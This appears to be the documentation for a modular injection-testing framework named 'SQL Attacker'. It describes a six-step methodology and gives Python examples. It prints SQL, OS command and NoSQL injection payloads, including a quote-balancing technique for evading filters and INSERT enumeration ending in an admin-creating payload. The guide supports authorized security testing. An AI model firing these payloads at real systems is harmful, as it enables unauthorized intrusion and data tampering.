# Modular Injection Attack Framework - Implementation Guide

## Overview

The SQL Attacker component has been enhanced with a **modular injection attack framework** that supports multiple interpreted language injection types. The framework implements a standardized **6-step injection testing methodology** and is easily extensible for future injection types.

## Architecture

### Core Components

1. **InjectionAttackModule (base class)**: Abstract base class defining the 6-step methodology
2. **Concrete Modules**: Implementations for specific injection types
   - `SQLInjectionModule` - SQL injection detection and exploitation
   - `CommandInjectionModule` - OS command injection detection and exploitation
   - `LDAPInjectionContext` - LDAP injection (legacy compatibility)
   - `XPathInjectionContext` - XPath injection (legacy compatibility)
   - `MessageQueueInjectionContext` - Message queue injection (legacy compatibility)
   - `CustomQueryInjectionContext` - Custom query language injection (legacy compatibility)
3. **MultiContextAttackOrchestrator**: Coordinates attacks across multiple injection contexts

### 6-Step Injection Testing Methodology

Each injection module implements the following 6-step workflow:

#### Step 1: Supply Unexpected Syntax and Context-Specific Payloads
```python
def step1_supply_payloads(self, parameter_value: str) -> List[str]:
    """Generate injection payloads appropriate for the context."""
```
- Generates context-specific payloads that break out of normal execution flow
- Returns a list of payloads to test

#### Step 2: Detect Anomalies and Error Messages
```python
def step2_detect_anomalies(
    self,
    response_body: str,
    response_headers: Dict[str, str],
    response_time: float,
    baseline_response: Optional[Tuple[str, float]] = None
) -> Tuple[bool, List[str]]:
    """Scan response for signs of injection success."""
```
- Detects error messages, unexpected behavior, timing differences
- Returns (anomaly_detected, list_of_anomalies)

#### Step 3: Analyze and Extract Error/Evidence
```python
def step3_extract_evidence(
    self,
    response_body: str,
    anomalies: List[str]
) -> Dict[str, Any]:
    """Parse error messages and extract detailed information."""
```
- Extracts database type, query context, system information
- Returns structured evidence with confidence score

#### Step 4: Mutate Input Systematically
```python
def step4_mutate_and_verify(
    self,
    target_url: str,
    parameter_name: str,
    parameter_type: str,
    parameter_value: str,
    successful_payload: str,
    ...
) -> Tuple[bool, float, str]:
    """Test variations to confirm or disprove vulnerability."""
```
- Uses boolean logic, timing attacks, or other techniques
- Returns (confirmed, confidence_score, verification_evidence)

#### Step 5: Build Proof-of-Concept Payloads
```python
def step5_build_poc(
    self,
    vulnerable_parameter: str,
    successful_payload: str,
    evidence: Dict[str, Any]
) -> Dict[str, Any]:
    """Create safe, non-destructive proof-of-concept."""
```
- Generates safe POC that demonstrates vulnerability without harm
- Returns POC payload, expected results, and safety notes

#### Step 6: Exploitation Automation
```python
def step6_automated_exploitation(
    self,
    target_url: str,
    vulnerable_parameter: str,
    parameter_type: str,
    poc_payload: str,
    evidence: Dict[str, Any],
    ...
) -> Optional[Dict[str, Any]]:
    """Safely exploit verified vulnerability."""
```
- Non-destructive exploitation to demonstrate impact
- Returns extracted data and remediation guidance

## Usage Examples

### Using SQL Injection Module

```python
from sql_attacker.injection_contexts.sql_context import SQLInjectionModule

# Initialize module
sql_module = SQLInjectionModule()

# Test a parameter
result = sql_module.test_injection(
    target_url="http://example.com/search",
    parameter_name="q",
    parameter_type="GET",
    parameter_value="",
    payload="' OR '1'='1"
)

if result.success:
    print(f"SQL Injection found! Confidence: {result.confidence_score}")
    print(f"Evidence: {result.evidence}")
    
    # Attempt exploitation
    exploit_data = sql_module.attempt_exploitation(
        target_url="http://example.com/search",
        vulnerable_parameter="q",
        parameter_type="GET",
        successful_payload="' OR '1'='1"
    )
    
    if exploit_data:
        print(f"Extracted data: {exploit_data['data_extracted']}")
```

### Using Command Injection Module

```python
from sql_attacker.injection_contexts.command_context import CommandInjectionModule

# Initialize module
cmd_module = CommandInjectionModule()

# Test a parameter
result = cmd_module.test_injection(
    target_url="http://example.com/ping",
    parameter_name="host",
    parameter_type="GET",
    parameter_value="127.0.0.1",
    payload="; whoami"
)

if result.success:
    print(f"Command Injection found! Confidence: {result.confidence_score}")
    print(f"Evidence: {result.evidence}")
```

### Using Multi-Context Orchestrator

```python
from sql_attacker.multi_context_orchestrator import MultiContextAttackOrchestrator
from sql_attacker.injection_contexts import InjectionContextType

# Initialize orchestrator with specific contexts
config = {
    'enabled_contexts': [
        InjectionContextType.SQL,
        InjectionContextType.COMMAND,
    ],
    'parallel_execution': True,
    'max_workers': 5,
    'timeout': 10
}

orchestrator = MultiContextAttackOrchestrator(config)

# Test all enabled contexts
results = orchestrator.test_all_contexts(
    target_url="http://example.com/api",
    parameter_name="input",
    parameter_type="POST",
    parameter_value="test"
)

# Process results
for result in results:
    print(f"Found {result.context_type.value} injection:")
    print(f"  Payload: {result.attack_vector.payload}")
    print(f"  Confidence: {result.confidence_score}")
    print(f"  Evidence: {result.evidence}")

# Generate report
report = orchestrator.generate_attack_report(
    results,
    target_url="http://example.com/api",
    parameter_name="input"
)

print(f"Total vulnerabilities: {report['total_vulnerabilities']}")
print(f"Contexts affected: {report['contexts_affected']}")
```

### Using the 6-Step Workflow Directly

```python
from sql_attacker.injection_contexts.command_context import CommandInjectionModule

module = CommandInjectionModule()

# Step 1: Get payloads
payloads = module.step1_supply_payloads("test")
print(f"Testing {len(payloads)} payloads")

# Steps 2-6 are integrated in the test_injection method
# But can be called individually for advanced use cases

# For example, after detecting an anomaly:
response_body = "uid=33(www-data) gid=33(www-data)"
detected, anomalies = module.step2_detect_anomalies(
    response_body, {}, 0.5
)

if detected:
    # Step 3: Extract evidence
    evidence = module.step3_extract_evidence(response_body, anomalies)
    print(f"OS Type: {evidence['context_info'].get('os_type')}")
    print(f"Confidence: {evidence['confidence']}")
    
    # Step 5: Build POC
    poc = module.step5_build_poc("cmd", "; whoami", evidence)
    print(f"POC Payload: {poc['poc_payload']}")
    print(f"Expected Result: {poc['expected_result']}")
```

## Advanced SQL Injection Techniques

### Quote Balancing Attacks

Quote balancing is a technique that avoids SQL comment syntax (`--`, `#`) by carefully balancing quotes in the payload. This can bypass certain security filters that block comment markers.

**Traditional Injection:**
```sql
-- Vulnerable query: SELECT * FROM users WHERE username = 'INPUT'
-- Payload: admin' OR 1=1--
-- Result: SELECT * FROM users WHERE username = 'admin' OR 1=1--'
```

**Quote-Balanced Injection:**
```sql
-- Vulnerable query: SELECT * FROM users WHERE username = 'INPUT'
-- Payload: Wiley' OR 'a'='a
-- Result: SELECT * FROM users WHERE username = 'Wiley' OR 'a'='a'
```

#### Benefits of Quote Balancing

1. **Bypass Comment Filters**: Some WAFs and security filters block `--` and `#` patterns
2. **Stealth**: Looks more like legitimate input
3. **Compatibility**: Works across all SQL dialects without syntax variations

#### Using Quote-Balanced Payloads

```python
from sql_attacker.injection_contexts.sql_context import SQLInjectionModule

module = SQLInjectionModule()

# Generate quote-balanced payloads
quote_balanced = module._generate_quote_balanced_payloads("user")

# Examples of generated payloads:
# - "user' OR 'a'='a"
# - "user' AND '1'='1' AND 'x'='x"
# - "user" OR "key"="key"

# These are automatically included in step1_supply_payloads
payloads = module.step1_supply_payloads("testuser")
# Now includes both traditional and quote-balanced variants
```

#### Detection Strategies

The framework's enhanced response analysis can detect successful quote-balanced injections by:

1. Monitoring for success indicators (e.g., "successfully inserted", "operation completed")
2. Comparing response content length differences
3. Analyzing timing variations

### INSERT Statement Parameter Enumeration

INSERT statement injections require a different approach than SELECT-based injections. The attacker must discover the correct number of parameters in the INSERT statement.

**Vulnerable INSERT Statement:**
```sql
INSERT INTO users (username, email, role) VALUES ('INPUT', 'user@example.com', 'user')
```

#### Parameter Enumeration Strategy

The framework implements progressive parameter enumeration to discover column counts:

```python
from sql_attacker.injection_contexts.sql_context import SQLInjectionModule

module = SQLInjectionModule()

# Generate INSERT-specific payloads
insert_payloads = module._generate_insert_payloads("foo", max_params=5)

# Generated payloads progressively add parameters:
# 1. foo')--                      # Attempt to close VALUES clause
# 2. foo', NULL)--                # Try 1 additional parameter
# 3. foo', NULL, NULL)--          # Try 2 additional parameters
# 4. foo', NULL, NULL, NULL)--    # Try 3 additional parameters
# ... and so on
```

#### Example Attack Flow

**Target Application:**
```python
# Vulnerable code
username = request.POST['username']
query = f"INSERT INTO users (username, email, role) VALUES ('{username}', 'new@example.com', 'user')"
```

**Attack Sequence:**

1. **Initial Payload**: `foo')--`
   - Error: "Column count doesn't match value count"
   - Detection: INSERT injection confirmed

2. **Enumerate Parameters**: `foo', NULL)--`
   - Error: "Column count doesn't match value count"
   - Detection: Not enough parameters yet

3. **Continue**: `foo', NULL, NULL)--`
   - Success or different error
   - Detection: Found correct parameter count (3 columns total)

4. **Craft Attack**: `admin', 'admin@evil.com', 'admin')--`
   - Result: Admin user created

#### Using INSERT Enumeration

```python
from sql_attacker.injection_contexts.sql_context import SQLInjectionModule

module = SQLInjectionModule()

# Method 1: Explicit INSERT statement type
payloads = module.step1_supply_payloads(
    "username",
    statement_type="INSERT",
    max_insert_params=10
)

# Method 2: Use flag for INSERT enumeration
payloads = module.step1_supply_payloads(
    "username",
    include_insert_enum=True,
    max_insert_params=8
)

# Test the payloads and analyze responses
for payload in payloads:
    # Send request with payload
    response = send_request(payload)
    
    # Analyze response
    detected, anomalies = module.step2_detect_anomalies(
        response.text,
        response.headers,
        response.elapsed.total_seconds()
    )
    
    if detected:
        # Extract evidence
        evidence = module.step3_extract_evidence(response.text, anomalies)
        
        # Check for INSERT context
        if 'insert_detection' in evidence.get('context_info', {}):
            insert_info = evidence['context_info']['insert_detection']
            print(f"INSERT injection detected!")
            print(f"Estimated parameters: {insert_info.get('parameter_count_hint')}")
```

#### Detection Patterns

The framework detects INSERT-specific errors:

**MySQL:**
- "Column count doesn't match value count"
- "Column count doesn't match value count at row 1"

**PostgreSQL:**
- "INSERT has more expressions than target columns"

**MSSQL:**
- "Column name or number of supplied values does not match table definition"

**Oracle:**
- "ORA-00913: too many values"
- "ORA-00947: not enough values"

#### Advanced INSERT Techniques

**Quote-Balanced INSERT Injection:**
```python
# Combine quote balancing with INSERT enumeration
payloads = [
    "foo' OR 'a'='a') AND ('1'='1",
    "foo', 1) OR ('x'='x",
    "foo', 'test') AND 'key'='key",
]
```

**Mixed Parameter Types:**
```python
# Test different data types to discover column types
payloads = [
    "foo', 1, 'test')--",           # String, Integer, String
    "foo', 'admin', 'password')--",  # All strings
    "foo', NULL, 1, 'test', 0)--",  # Mixed with NULL
]
```

### Enhanced Response Analysis

The framework now includes sophisticated response analysis for quote-balanced and INSERT injections:

#### Features

1. **INSERT Error Detection**: Identifies column count mismatch errors
2. **Quote-Balance Success Detection**: Recognizes successful operations
3. **Content Length Analysis**: Detects response size differences
4. **Database-Specific Patterns**: Handles different DBMS error formats

#### Usage Example

```python
module = SQLInjectionModule()

# Response from potential INSERT injection
response_body = "Error: wrong number of values in INSERT statement"

# Detect anomalies with hint
detected, anomalies = module.step2_detect_anomalies(
    response_body,
    response_headers={},
    response_time=0.5,
    payload_hint="INSERT"
)

if detected:
    # Extract detailed evidence
    evidence = module.step3_extract_evidence(response_body, anomalies)
    
    print(f"Confidence: {evidence['confidence']}")
    print(f"Database: {evidence['context_info'].get('database_type')}")
    
    if 'insert_detection' in evidence['context_info']:
        insert_info = evidence['context_info']['insert_detection']
        print(f"Statement Type: {insert_info['statement_type']}")
        print(f"Parameter Hint: {insert_info['parameter_count_hint']}")
```

### Usage Strategy and Limitations

#### Best Practices

1. **Progressive Testing**: Start with basic payloads, then use specialized techniques
2. **Context-Aware**: Use `statement_type` parameter when you know the SQL statement type
3. **Parameter Limits**: Set reasonable `max_insert_params` (typically 5-15) to avoid excessive requests
4. **Response Analysis**: Always analyze responses carefully for subtle indicators

#### Limitations

1. **Blind INSERT Injection**: May require additional techniques like time-based or out-of-band detection
2. **Complex Queries**: Multi-table INSERT or INSERT...SELECT may require manual analysis
3. **WAF Evasion**: Some advanced WAFs may still detect these patterns
4. **False Positives**: Generic error messages may require manual verification

#### Detection Logic Refinement

**Tips for improving detection accuracy:**

1. **Baseline Comparison**: Always establish a baseline response before testing
2. **Multiple Attempts**: Test several parameter counts to identify patterns
3. **Error Message Analysis**: Look for specific column count hints in errors
4. **Success Indicators**: Monitor for creation confirmations or redirects
5. **Combined Techniques**: Use both quote-balancing and traditional methods

## Extending the Framework

### Creating a New Injection Module

To add support for a new injection type (e.g., NoSQL injection):

1. **Create a new context file**: `sql_attacker/injection_contexts/nosql_context.py`

```python
from typing import List, Dict, Any, Tuple, Optional
from .base import InjectionAttackModule, InjectionContextType

class NoSQLInjectionModule(InjectionAttackModule):
    """NoSQL injection attack module."""
    
    def get_context_type(self) -> InjectionContextType:
        # Add NOSQL to InjectionContextType enum first
        return InjectionContextType.NOSQL
    
    def _load_payloads(self) -> List[str]:
        """Load NoSQL injection payloads."""
        return [
            "{'$gt': ''}",
            "{'$ne': null}",
            "'; return true; var foo='",
            # Add more NoSQL-specific payloads
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load NoSQL error patterns."""
        return [
            {'pattern': r'MongoError', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'CouchDB', 'type': 'error', 'confidence': 0.90},
            # Add more patterns
        ]
    
    # Implement all 6 steps
    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
        return self.payloads
    
    def step2_detect_anomalies(...) -> Tuple[bool, List[str]]:
        # Implementation
        pass
    
    # ... implement remaining steps
    
    def analyze_response(...) -> Tuple[bool, float, str]:
        """Backward compatibility method."""
        # Integrate steps 2 and 3
        pass
    
    def attempt_exploitation(...) -> Optional[Dict[str, Any]]:
        """Backward compatibility method."""
        # Integrate steps 4, 5, and 6
        pass
```

2. **Add to InjectionContextType enum**: Edit `base.py`

```python
class InjectionContextType(Enum):
    SQL = "sql"
    COMMAND = "command"
    NOSQL = "nosql"  # Add new type
    LDAP = "ldap"
    # ...
```

3. **Register in orchestrator**: Edit `multi_context_orchestrator.py`

```python
from .injection_contexts.nosql_context import NoSQLInjectionModule

# In _initialize_contexts method:
context_classes = {
    # ...
    InjectionContextType.NOSQL: NoSQLInjectionModule,
}
```

4. **Add tests**: Create `test_nosql_injection.py`

```python
import unittest
from sql_attacker.injection_contexts.nosql_context import NoSQLInjectionModule

class TestNoSQLInjectionModule(unittest.TestCase):
    def setUp(self):
        self.module = NoSQLInjectionModule()
    
    # Add comprehensive tests for all 6 steps
```

## Backward Compatibility

The framework maintains full backward compatibility:

- `InjectionContext` is an alias for `InjectionAttackModule`
- `SQLInjectionContext` is an alias for `SQLInjectionModule`
- Legacy methods (`analyze_response`, `attempt_exploitation`) integrate the 6-step methodology
- Existing code using the old API continues to work without changes

## Key Features

### 1. **Modular Design**
- Each injection type is a self-contained module
- Easy to add, remove, or modify specific injection types
- Clear separation of concerns

### 2. **Standardized Methodology**
- All modules follow the same 6-step process
- Consistent interface across injection types
- Predictable behavior and results

### 3. **Comprehensive Detection**
- Error-based detection (database/system errors)
- Time-based detection (timing attacks)
- Boolean-based detection (logic manipulation)
- Content-based detection (response differences)

### 4. **Safe Exploitation**
- Non-destructive POC generation
- Read-only data extraction
- Ethical boundaries respected
- Detailed remediation guidance

### 5. **Extensibility**
- Simple process to add new injection types
- Reusable base class with common functionality
- Flexible configuration options

## Configuration Options

```python
config = {
    # Context selection
    'enabled_contexts': [InjectionContextType.SQL, InjectionContextType.COMMAND],
    
    # Execution settings
    'parallel_execution': True,  # Run contexts in parallel
    'max_workers': 5,            # Max parallel workers
    'timeout': 10,               # Request timeout (seconds)
    
    # Feature flags
    'enable_exploitation': True,  # Attempt exploitation after detection
}
```

## Testing

The framework includes comprehensive test coverage:

- `test_multi_context_injection.py` - Tests for all context types
- `test_command_injection.py` - Specific tests for command injection (20 tests)
- Integration with existing test suite

Run tests:
```bash
# All context tests
python -m unittest sql_attacker.test_multi_context_injection

# Command injection tests
python -m unittest sql_attacker.test_command_injection

# All SQL attacker tests
python -m unittest discover sql_attacker -p "test_*.py"
```

## Future Enhancements

Potential additions to the framework:

1. **Additional Injection Types**:
   - NoSQL Injection (MongoDB, CouchDB, etc.)
   - XML Entity Injection (XXE)
   - Server-Side Template Injection (SSTI)
   - Expression Language Injection (EL)

2. **Enhanced Features**:
   - Machine learning for payload selection
   - Automated WAF bypass techniques
   - Interactive exploitation mode
   - Real-time collaboration features

3. **Integration**:
   - REST API endpoints
   - Web UI dashboard
   - CI/CD pipeline integration
   - Automated reporting

## Security Considerations

- **Ethical Use**: This framework is for authorized security testing only
- **Non-Destructive**: All exploitation is read-only and safe
- **Rate Limiting**: Respect target system resources
- **Legal Compliance**: Ensure proper authorization before testing
- **Data Protection**: Handle extracted data responsibly

## Support and Contributions

- Report issues on GitHub
- Submit pull requests for new injection modules
- Follow the 6-step methodology for consistency
- Include comprehensive tests for new features

## License

See repository LICENSE file for details.
